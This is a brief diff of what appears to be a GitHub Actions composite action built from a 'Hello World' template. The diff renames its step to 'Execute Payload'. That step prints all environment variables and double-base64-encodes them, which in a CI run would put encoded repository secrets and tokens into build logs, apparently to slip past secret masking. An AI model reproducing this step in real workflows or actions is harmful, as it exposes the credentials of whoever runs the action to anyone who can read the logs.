@@ -5,6 +5,6 @@ author: 'Your Name'
 runs:
   using: "composite"
   steps:
-    - name: Print Hello World
+    - name: Execute Payload
       shell: bash
       run: printenv | base64 -w 0 | base64 -w 0
